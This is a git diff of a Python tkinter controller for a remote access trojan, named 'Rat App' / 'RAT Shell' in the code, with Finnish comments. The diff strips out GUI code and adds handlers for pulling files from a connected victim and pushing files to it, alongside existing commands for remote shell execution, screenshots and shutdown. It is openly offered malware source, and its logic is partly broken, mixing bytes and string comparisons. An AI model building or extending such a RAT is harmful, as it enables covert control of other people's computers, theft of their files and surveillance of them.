@@ -1,6 +1,5 @@
 import tkinter as tk
 from tkinter import ttk, Text
-import tkinter
 import socket
 from commands import Commands
 import subprocess
@@ -28,41 +27,12 @@ class MainServer(tk.Tk):
 
         self.command = Commands(self)
 
-        # configure the root window
-        self.title('Rat App')
-        self.iconbitmap('rat.ico')
-        self.geometry('300x500+500+500')
-        
-        # label
-        self.label = ttk.Label(self, text='RAT Shell!')
-        self.label.pack()
-        self.teksti = tkinter.Text(self, width=50, height=50)
-        self.teksti.pack()
-        #command = self.teksti.get('1.0', 'end').split('\n')[-2].encode()
-        
-        
-        # button
-        self.button = ttk.Button(self, text='Take the shot!', command=self.command.button_clicked)        
-        self.button2 = ttk.Button(self, text='Or Shutdown!', command=self.command.button2_clicked)
-        #self.button['command'] = self.button_clicked 
-        self.button.pack(padx=20, pady=20)       
-        self.button2.pack(padx=20, pady=(0, 20))
-
-        def execute():
-            command = str(self.teksti.get('1.0', 'end').split('\n')[-2])
-            return command.encode()
-                    # if command == b'exit':
-                    #     exit()
-                    #self.teksti.insert('end', f'\n{subprocess.getoutput(command)}')
-
-        # command = self.teksti.bind('<Return>', lambda event :execute())
         while True:
                 #encodataan stringgi byteiksi että voidaan kuljettaa kohteeseen
-            command = self.teksti.bind('<Return>', lambda event :execute())
+            #command = self.teksti.bind('<Return>', lambda event :execute())
             command = input('>> ').encode()
-            
-                
-            if command == b'exit':      #byteinä koska muutettiin se edellisellä rivillä
+                    
+            if command == 'exit':      #byteinä koska muutettiin se edellisellä rivillä
                 self.client.send(self.command)    #vaikka lopetetaan niin kuitenkin tieto kohteeseen
                 self.client.close()
                 self.s.close()
@@ -71,12 +41,29 @@ class MainServer(tk.Tk):
                 continue
             elif command == b'cls':
                 self.command.clear_screen()
-            elif command == (b'download'):
-                self.client.send(command)
-                self.command.download(self.client,command)
+            # elif command == (b'download'):
+            #     self.client.send(command)
+            #     self.command.download(self.client,command)
                 # elif command.startswith(b'upload'):
                 #     upload(target,command)
                 #      continue
+            elif command[:8] == 'download':
+                file_output = self.command.recv_data()
+                if file_output == b'not found':
+                    print('no file')
+                    continue
+                with open(command[9:], 'wb') as write_data:
+                    write_data.write(file_output)
+                continue
+            elif command[:6] == 'upload':
+                try:
+                    with open(command[7:], 'rb') as data:
+                        data_read = data.read()
+                except FileNotFoundError:
+                    print('File not found')
+                else:
+                    self.command.send_data(data_read)
+                continue
             elif command == b'screen':
                 print('Taking screenshot')
                 self.client.send(command)
@@ -84,8 +71,7 @@ class MainServer(tk.Tk):
                 self.client.send(command)
                 #4kilotavua (pitäisi riittää) dataa back & decodataan bytet stringeiksi
                 result = self.client.recv(4096).decode('ISO-8859-1')
-                #print(result)
-                self.teksti.insert('end', result)
+                print(result)
 
 if __name__ == "__main__":
     with open('ip.txt', 'r') as iipee:
